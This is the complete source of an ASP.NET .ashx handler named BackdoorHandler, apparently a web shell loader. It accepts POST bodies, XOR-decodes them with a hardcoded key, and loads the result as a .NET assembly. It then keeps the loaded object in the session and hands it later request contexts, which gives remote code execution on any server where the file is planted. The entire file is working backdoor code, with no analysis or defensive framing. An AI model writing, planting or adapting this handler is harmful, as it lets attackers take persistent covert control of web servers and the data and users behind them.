<%@ WebHandler Language="C#" Class="BackdoorHandler" %>

using System;
using System.Web;
using System.Web.SessionState;
using System.Reflection;

public class BackdoorHandler : IHttpHandler, IRequiresSessionState
{
    
    public void ProcessRequest(HttpContext context)
    {
        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        if (request.HttpMethod == "POST")
        {
            try
            {
                int totalBytes = request.TotalBytes;
                if (totalBytes <= 0)
                    return;
                
                byte[] rawData = request.BinaryRead(totalBytes);
                object loader = context.Session["nebulapulsar"];
                
                if (loader == null)
                {
                    byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes("NBPULSARDEADBEEF");
                    for (int i = 0; i < rawData.Length; i++)
                        rawData[i] = (byte)(rawData[i] ^ keyBytes[(i + 1) & 15]);

                    Assembly asm = Assembly.Load(rawData);
                    loader = Activator.CreateInstance(asm.GetType("NebulaPulsar"));
                    context.Session["nebulapulsar"] = loader;
                    response.Write("LOADER_INIT_SUCCESS");
                }
                else
                {
                    context.Items["rawPostData"] = rawData;
                    loader.GetType().GetMethod("Equals", new Type[]{typeof(object)}).Invoke(loader, new object[]{context});
                }
            }
            catch (Exception ex)
            {
                response.Write("ASHX_PORT_ERROR: " + ex.Message);
            }
        }
    }

    public bool IsReusable {
        get { return true; }
    }
}